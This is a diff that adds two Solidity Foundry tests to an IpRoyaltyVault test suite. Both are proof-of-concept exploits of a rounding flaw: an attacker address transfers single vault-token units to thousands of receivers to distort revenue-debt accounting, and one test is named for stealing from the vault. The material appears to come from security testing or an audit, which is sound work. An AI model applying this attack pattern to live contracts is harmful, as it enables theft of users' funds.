@@ -752,4 +752,72 @@ contract TestIpRoyaltyVault is BaseTest, ERC721Holder {
         assertEq(ipRoyaltyVault.claimableRevenue(address(2), address(USDC)), 0);
         assertEq(ipRoyaltyVault.claimableRevenue(alice, address(USDC)), 0);
     }
+    function test_IpRoyaltyVault_rounding() public {
+        address ipId = address(2);
+        address attacker = makeAddr("attacker");
+
+        USDC.mint(attacker, 99_999_999); // 100k USDC
+        vm.prank(attacker);
+        USDC.approve(address(royaltyModule), 99_999_999);
+
+        vm.prank(address(licensingModule));
+        royaltyModule.onLicenseMinting(ipId, address(royaltyPolicyLAP), uint32(10e6), "");
+        IpRoyaltyVault ipRoyaltyVault = IpRoyaltyVault(royaltyModule.ipRoyaltyVaults(ipId));
+
+        vm.prank(ipId);
+        ipRoyaltyVault.transfer(attacker, 1e8);
+
+
+        vm.startPrank(attacker);
+        royaltyModule.payRoyaltyOnBehalf(ipId, ipId, address(USDC), 99_999_999);
+        uint numRuns = 1e4;
+        for (uint i; i < numRuns; i++) {
+            address receiver = address(uint160(100 + i));
+            ipRoyaltyVault.transfer(receiver, 1);
+            assertEq(ipRoyaltyVault.claimerRevenueDebt(receiver, address(USDC)), 0);
+            assertEq(ipRoyaltyVault.claimableRevenue(receiver, address(USDC)), 0);
+            assertEq(ipRoyaltyVault.claimableRevenue(attacker, address(USDC)), 99_999_999);
+        }
+        vm.stopPrank();
+
+        assertEq(ipRoyaltyVault.claimerRevenueDebt(attacker, address(USDC)), -int(numRuns));
+        assertEq(USDC.balanceOf(attacker), 0);
+        assertEq(ipRoyaltyVault.claimableRevenue(attacker, address(USDC)), 99_999_999);
+    }
+
+    function testZach_StealFromVault2() public {
+        address ipId = address(2);
+        address attacker = makeAddr("attacker");
+
+        USDC.mint(attacker, 100_000_000);
+        vm.prank(attacker);
+        USDC.approve(address(royaltyModule), 100_000_000);
+
+        vm.prank(address(licensingModule));
+        royaltyModule.onLicenseMinting(ipId, address(royaltyPolicyLAP), uint32(10e6), "");
+        IpRoyaltyVault ipRoyaltyVault = IpRoyaltyVault(royaltyModule.ipRoyaltyVaults(ipId));
+
+        vm.prank(ipId);
+        ipRoyaltyVault.transfer(attacker, 1e8);
+
+
+        vm.startPrank(attacker);
+        royaltyModule.payRoyaltyOnBehalf(ipId, ipId, address(USDC), 99_999_999);
+        uint numRuns = 1e4;
+        for (uint i; i < numRuns; i++) {
+            address receiver = address(uint160(100 + i));
+            ipRoyaltyVault.transfer(receiver, 1);
+            assertEq(ipRoyaltyVault.claimableRevenue(receiver, address(USDC)), 0);
+        }
+
+        assertEq(ipRoyaltyVault.claimableRevenue(attacker, address(USDC)), 99_999_999);
+
+        royaltyModule.payRoyaltyOnBehalf(ipId, ipId, address(USDC), 1);
+
+        for (uint i; i < numRuns; i++) {
+            address receiver = address(uint160(100 + i));
+            assertEq(ipRoyaltyVault.claimableRevenue(receiver, address(USDC)), 0);
+        }
+    }
+
 }
